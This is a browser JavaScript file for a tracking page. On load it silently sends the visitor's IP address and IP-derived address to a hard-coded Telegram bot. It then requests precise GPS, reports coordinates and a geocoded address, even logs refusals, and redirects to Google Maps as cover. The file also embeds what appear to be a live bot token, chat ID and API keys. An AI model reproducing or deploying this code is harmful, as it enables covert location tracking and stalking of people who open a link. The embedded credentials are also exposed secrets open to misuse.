const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
const CHAT_ID = '6602027873';
const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';

// 📍 Build readable address, always includes Narath if available
function buildAddress(components) {
  const country = components.country || '';
  const state = components.state || '';
  const county = components.county || components.district || '';
  const subplace =
    components.suburb ||
    components.village ||
    components.town ||
    components.city ||
    components.neighbourhood ||
    '';
  return `${country}, ${state}, ${county}, ${subplace}`;
}

// 💬 Send message to Telegram
async function sendToTelegram(message) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  });
}

// 🌐 Get IP & location via IPInfo
async function getIPInfo() {
  try {
    const res = await fetch('https://ipinfo.io/json?token=8e640acb36a3409a9877e0c900653f7d');
    return await res.json();
  } catch {
    return { ip: 'unknown', loc: '0,0' };
  }
}

// 🌍 Reverse geocode GPS coords to address
async function getLocationInfo(lat, lon) {
  try {
    const res = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`);
    const data = await res.json();
    return data.results[0]?.components || {};
  } catch {
    return {};
  }
}

// ✅ When user allows location
async function handleAllowedLocation(lat, lon) {
  const ipData = await getIPInfo();
  const components = await getLocationInfo(lat, lon);
  const address = buildAddress(components);

  await sendToTelegram(`✅ USER ALLOWED LOCATION
🔹 IP: ${ipData.ip}
🔹 GPS: ${lat}, ${lon}
📍 Address: ${address}`);

  window.location.href = `https://www.google.com/maps/@${lat},${lon},15z`;
}

// ❌ When permission is denied or not supported
async function getAndSendIPBasedLocation(reason = "❌ USER DENIED OR BLOCKED") {
  const ipData = await getIPInfo();
  const [lat, lon] = (ipData.loc || '0,0').split(',');
  const components = await getLocationInfo(lat, lon);
  const address = buildAddress(components);

  await sendToTelegram(`${reason}
🔹 IP: ${ipData.ip}
📍 IP-Based Address: ${address}`);
}

// 🎯 Location logic
function getLocation() {
  // Step 1: Always send IP-based immediately
  getAndSendIPBasedLocation("🔄 USER OPENED LINK");

  // Step 2: Try GPS
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      handleAllowedLocation(pos.coords.latitude, pos.coords.longitude);
    },
    () => {
      getAndSendIPBasedLocation("❌ USER DENIED LOCATION ACCESS");
    },
    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
  );
}

// 🔁 Retry button logic
function retryLocation() {
  getLocation();
}

// 🚀 On page load
window.onload = () => {
  document.getElementById("loading-screen").style.display = "flex";
  getLocation();

  if (navigator.permissions) {
    navigator.permissions.query({ name: 'geolocation' }).then((perm) => {
      perm.onchange = () => {
        if (perm.state === 'granted') location.reload();
      };
    });
  }
};
